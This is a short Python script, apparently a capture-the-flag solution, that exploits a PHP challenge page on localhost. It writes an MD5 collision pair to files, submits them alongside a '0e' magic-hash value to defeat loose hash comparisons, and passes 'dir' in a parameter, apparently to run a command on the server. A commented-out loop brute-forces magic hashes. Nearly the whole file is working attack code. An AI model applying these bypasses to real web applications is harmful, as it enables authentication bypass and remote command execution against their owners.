# -*- coding: utf-8 -*-
# @Author : Hn13
# @Blog   : https://www.hn13.top
import requests
import hashlib

hexString1 = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2'
hexString2 = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2'

hexList1 = []
intList1 = []
asciiString1 =''

while True:
    intString1 = hexString1[0:2]
    hexString1 = hexString1[2:]
    hexList1.append(intString1)
    if (hexString1 == ''):
        break

for i in hexList1:
    intList1.append(int(i,16))
for j in intList1:
    asciiString1 += chr(int(j))

f = open('1.bin','w')
f.write(asciiString1)
f.close()

hexList2 = []
intList2 = []
asciiString2 =''

while True:
    intString2 = hexString2[0:2]
    hexString2 = hexString2[2:]
    hexList2.append(intString2)
    if (hexString2 == ''):
        break

for i in hexList2:
    intList2.append(int(i,16))
for j in intList2:
    asciiString2 += chr(int(j))

f = open('2.bin','w')
f.write(asciiString2)
f.close()
p1 = open('1.bin')
p2 = open('2.bin')
url = 'http://127.0.0.1/2048/T1m3T0getFl4g.php'
data = {'ezmd51': p1, 'ezmd52': p2, 'QnnM': '776%20'}
# hdmd5 = 0
# for a in range(1, 10**16):
'''a = 0
while a < 10**30:
    a = str(a)
    num = '0e'+a
    md5 = hashlib.md5(num.encode('utf-8')).hexdigest()
    if md5[0:2] == '0e' and md5[2:].isdigit():
        hdmd5 = a
        break
    print "no "+num
    a=int(a)+1'''

r = requests.post(url, data=data, params={'hdmd5': "0e1138100474", 'hn13': "dir"})
print r.text
